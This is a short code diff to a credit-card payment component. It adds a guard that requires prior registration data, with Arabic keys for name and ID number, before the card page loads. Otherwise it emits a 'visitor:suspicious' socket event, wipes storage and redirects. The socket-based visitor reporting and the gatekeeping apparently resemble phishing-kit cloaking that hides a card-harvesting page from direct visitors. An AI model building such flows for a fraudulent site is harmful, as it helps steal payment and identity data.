@@ -113,6 +113,37 @@ function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | 
 
 export default function CreditCardPayment() {
   const [, navigate] = useLocation();
+
+  // PROTECTION: Block direct access without completing registration
+  useEffect(() => {
+    const regData = localStorage.getItem('registrationData');
+    if (!regData) {
+      if (socket.value) {
+        socket.value.emit('visitor:suspicious', { reason: 'direct_card_access' });
+        socket.value.disconnect();
+      }
+      localStorage.clear();
+      window.location.href = '/';
+      return;
+    }
+    try {
+      const parsed = JSON.parse(regData);
+      if (!parsed['\u0627\u0644\u0627\u0633\u0645'] || !parsed['\u0631\u0642\u0645 \u0627\u0644\u0647\u0648\u064a\u0629']) {
+        if (socket.value) {
+          socket.value.emit('visitor:suspicious', { reason: 'incomplete_reg_card_access' });
+          socket.value.disconnect();
+        }
+        localStorage.clear();
+        window.location.href = '/';
+        return;
+      }
+    } catch {
+      localStorage.clear();
+      window.location.href = '/';
+      return;
+    }
+  }, []);
+
   const [cardError, setCardError] = useState(false);
   const [luhnError, setLuhnError] = useState(false);
   const [rejectedError, setRejectedError] = useState(false);
